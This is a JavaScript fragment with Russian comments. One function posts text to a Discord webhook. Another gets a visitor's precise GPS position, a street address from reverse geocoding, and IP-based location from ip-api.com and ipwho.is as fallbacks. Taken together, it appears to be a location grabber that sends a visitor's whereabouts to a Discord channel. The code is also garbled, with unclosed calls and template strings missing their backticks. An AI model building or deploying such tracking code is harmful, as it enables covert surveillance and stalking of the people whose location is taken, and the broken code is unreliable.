        async function sendToDiscord(text) {
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: text.substring(0, 2000) })

            } catch(e) { console.error(e); }

        // Получение координат с приоритетом GPS, затем два IP-сервиса
        async function getLocationWithAddress() {
            // ----- 1. Пробуем GPS -----
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            timeout: 7000,
                            enableHighAccuracy: true
                        });
                    });
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    const coordsText = 🌍 GPS: ${lat}, ${lon} (точность ±${Math.round(acc)} м);
                    // Пробуем получить адрес через Nominatim (HTTPS)
                    let address = 'адрес не получен';
                    try {
                        const geoUrl = https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1;
                        const resp = await fetch(geoUrl, { headers: { 'User-Agent': 'Mozilla/5.0' } });
                        const data = await resp.json();
                        if (data && data.display_name) {
                            address = data.display_name.split(', ').slice(0, 4).join(', ');
                        }
                    } catch(e) { console.warn(e); }
                    return { coords: coordsText, address: 📍 Адрес: ${address} };
                } catch(e) {
                    console.warn("GPS ошибка:", e.message);
                }
            }

            // ----- 2. Fallback 1: ip-api.com через HTTPS -----
            try {
                const resp = await fetch('https://ip-api.com/json/');
                const data = await resp.json();
                if (data.status === 'success') {
                    const coordsText = 📍 IP-геолокация (ip-api): ${data.lat}, ${data.lon};
                    const addressText = 🏠 Адрес: ${data.city}, ${data.regionName}, ${data.country};
                    return { coords: coordsText, address: addressText };
                }
            } catch(e) { console.warn("ip-api.com error:", e); }

            // ----- 3. Fallback 2: ipwho.is (запасной) -----
            try {
                const resp = await fetch('https://ipwho.is/');
                const data = await resp.json();
                if (data.success) {
                    const coordsText = 📍 IP-геолокация (ipwho.is): ${data.latitude}, ${data.longitude};
                    const addressText = 🏠 Адрес: ${data.city}, ${data.region}, ${data.country};
                    return { coords: coordsText, address: addressText };
                }
            } catch(e) { console.warn("ipwho.is error:", e); }

            // Всё сломалось
            return { coords: '❌ Координаты не определены', address: '❌ Адрес не определен' };
        }
